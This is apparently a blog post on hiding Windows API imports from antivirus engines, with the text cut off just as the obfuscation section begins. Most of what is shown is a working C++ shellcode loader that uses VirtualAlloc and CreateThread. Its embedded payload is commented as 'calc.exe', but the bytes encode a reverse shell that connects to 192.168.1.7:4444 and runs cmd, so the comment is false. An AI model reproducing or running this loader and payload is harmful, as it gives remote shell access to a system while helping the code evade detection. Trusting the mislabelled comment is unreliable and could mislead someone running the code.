---
layout: post
title: "AV engines evasion with function call Obfuscation with C++ example"
date: 2025-02-12
categories: [blog]
---
# Introduction

Portable Executable(PE) module such as .exe or .dll relies on imported functions because the executable does not define them. When program runs, the os loads these external functions from system DLLs (ex- KERNEL32.dll) into memory and making them available to the program. 
By analyzing these imported functions, AV engines can determine an executable’s functionality to detect potential malicious behavior in malicious executables. 

To bypass this detection, malware authors can use a technique called **Function Call Obfuscation**. Function call obfuscation is when hiding the external functions that will be called during runtime by manually loading and retrieving function addresses at runtime. For that we can use windows API functions called __GetModuleHandle__ and __GetProcAddress__. 

__GetModuleHandle__ – this retrieves handle to a DLL that is already loaded into the process memory. 

`HMODULE GetModuleHandleA(LPCSTR lpModuleName);`

__GetProcAddress__ -this can be used to get the memory address of a specific function exported from above DLL. 

`FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);`


to demonstrate the function level obfuscation technique I’ll first write a simple code to shellcode execution in memory in cpp. 

{% highlight cpp %}
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x07"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
  WaitForSingleObject(th, -1);
  return 0;
}
{% endhighlight %}

now lets see the imported functions from KERNEL32.dll in this executable. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.1.png" alt="function call" width="500">

you can see a imported function called **VirtualAlloc**. this is used to allocate memory for shellcode execution.
also lets check the virus total detection for this PE. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.2.png" alt="virus total detection" width="1000">  
as you can see 39 engines out of 72 identified this as malicious. a

let's use Function call obfuscation technique to remove this from loading. 

# Function Call Obfuscation
